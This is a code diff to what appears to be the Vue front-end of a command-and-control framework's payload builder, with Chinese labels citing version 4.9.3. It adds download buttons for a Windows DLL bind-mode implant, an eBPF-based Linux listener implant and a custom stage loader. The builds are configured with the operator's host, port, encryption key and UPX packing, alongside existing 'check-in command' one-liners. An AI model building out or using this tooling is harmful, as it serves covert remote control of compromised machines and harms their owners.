@@ -69,6 +69,22 @@ async function copyOneLiner(platform: 'linux' | 'windows', useWS = false) {
   catch { message.info(c) }
 }
 
+// 4.9.3 的「正向客户端」(Windows dll 监听模式) 与「ebpf 正向客户端」(Linux ebpf 监听)
+function downloadForward(ebpf = false) {
+  if (!form.vkey) { message.warning('加密key明文内容（Vkey）必填'); return }
+  const u = downloadURL('/download/listen', {
+    arch: form.arch, tp: form.tp, host: form.host, port: form.port,
+    vkey: form.vkey, salt: form.salt, upx: String(form.upx), ebpf: String(ebpf),
+  })
+  location.href = u
+}
+
+// 自定义 Stage：4.9.3 文案「利用Stage接口，可以很方便的自己编写阶段性加载器」
+function downloadStage() {
+  if (!form.id) { message.warning('先选择监听器'); return }
+  location.href = downloadURL('/download/stage', { id: form.id, arch: form.arch })
+}
+
 async function copy(kind: 'stageless' | 'listen', platform: 'auto' | 'windows' | 'linux' = 'auto') {
   const c = cmd(kind, platform)
   if (!c) return
@@ -107,7 +123,22 @@ async function copy(kind: 'stageless' | 'listen', platform: 'auto' | 'windows' |
       <a-button @click="copyOneLiner('windows')">Windows 上线命令</a-button>
     </a-space>
 
-    <a-divider>正向客户端（独立 listen 载荷）</a-divider>
+    <a-divider>自定义 Stage</a-divider>
+    <a-alert type="info" show-icon :closable="false" style="margin-bottom: 12px"
+      message="利用Stage接口，可以很方便的自己编写阶段性加载器" />
+    <a-space wrap>
+      <a-button @click="downloadStage">下载 Stage</a-button>
+    </a-space>
+
+    <a-divider>正向客户端 / ebpf 正向客户端</a-divider>
+    <a-alert type="info" show-icon :closable="false" style="margin-bottom: 12px"
+      message="正向客户端：Windows dll 监听模式客户端，正向连接上线；ebpf 正向客户端：Linux ebpf 监听模式客户端" />
+    <a-space wrap style="margin-bottom: 12px">
+      <a-button @click="downloadForward(false)">下载正向客户端</a-button>
+      <a-button @click="downloadForward(true)">下载 ebpf 正向客户端</a-button>
+    </a-space>
+
+    <a-divider>独立 listen 载荷（可自定义回连地址）</a-divider>
     <a-form layout="inline">
       <a-form-item label="连接方式">
         <a-select v-model:value="form.tp" style="width: 120px">
